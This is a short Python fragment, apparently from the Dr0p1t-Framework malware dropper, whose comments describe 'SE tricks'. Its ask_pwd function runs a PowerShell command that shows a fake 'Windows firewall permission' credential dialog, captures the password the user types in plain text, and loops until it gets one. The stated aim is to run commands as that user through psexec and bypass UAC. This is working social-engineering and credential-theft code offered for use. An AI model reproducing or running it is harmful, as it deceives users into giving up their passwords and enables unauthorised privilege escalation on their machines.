#Written by: Karim shoair - D4Vinci ( Dr0p1t-Framework )
#In this script I store some SE tricks to use ;)
#Start

#Get the user password by fooling him and then uses it to run commands as the user by psexec to bypass UAC
def ask_pwd():
	while True:
		cmd = '''Powershell "$cred=$host.ui.promptforcredential('Windows firewall permission','',[Environment]::UserName,[Environment]::UserDomainName); echo $cred.getnetworkcredential().password;"'''
		response = get_output(cmd)
		if response.strip() != '' and not response.strip().startswith('[!]'): break
	return response.strip()
